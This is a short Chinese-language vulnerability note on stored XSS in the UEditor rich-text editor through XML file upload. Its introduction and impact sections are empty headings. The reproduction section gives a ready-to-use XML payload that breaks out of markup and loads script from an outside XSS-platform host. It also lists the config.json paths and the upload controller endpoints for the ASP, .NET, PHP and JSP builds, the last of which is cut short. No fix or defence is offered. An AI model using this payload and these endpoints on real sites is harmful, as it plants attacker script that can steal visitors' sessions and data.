ueditor 允许xml上传的xss漏洞
============================

一、漏洞简介
------------

二、漏洞影响
------------

三、复现过程
------------

    <html>
    <head></head>
    <body>
    <something:script src="</tExtArEa>'"><sCRiPt sRC=http://xssye.com/tVbS></sCrIpT>" xmlns:something="xss平台地址">1234</something:script>
    </body>
    </html>

Ueditor 默认支持上传 xml ：config.json可以查看支持上传的后缀

    /ueditor/asp/config.json
    /ueditor/net/config.json
    /ueditor/php/config.json
    /ueditor/jsp/config.json

上传文件路径

    /ueditor/index.html

    /ueditor/asp/controller.asp?action=uploadimage
    /ueditor/asp/controller.asp?action=uploadfile

    /ueditor/net/controller.ashx?action=uploadimage
    /ueditor/net/controller.ashx?action=uploadfile

    /ueditor/php/controller.php?action=uploadfile
    /ueditor/php/controller.php?action=uploadimage

    /ueditor/jsp/controller.jsp?action=uploadfile
    /ueditor/jsp/controller.jsp?action=uploadimag
